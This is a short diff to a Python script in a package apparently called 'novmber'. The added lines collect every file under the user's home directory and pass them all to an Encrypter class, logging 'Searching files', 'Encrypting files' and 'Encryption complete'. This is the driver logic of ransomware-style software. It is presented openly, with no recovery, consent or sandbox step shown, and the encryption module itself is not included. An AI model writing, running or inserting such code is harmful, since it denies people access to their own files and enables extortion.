@@ -27,9 +27,21 @@
 # SOFTWARE.
 
 import logging
+from pathlib import Path
 
 from novmber.file_utils import FileUtils
+from novmber.encrypter import Encrypter
 
 logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
+files = FileUtils()
+enc = Encrypter()
 
+logger.info("Searching files...")
+files.get_all_files(Path.home())
+logger.info("Found %i files", files.get_n_of_files())
+
+logger.info("Encrypting files...")
+enc.encrypt_all(files.files)
+logger.info("Encryption complete.")
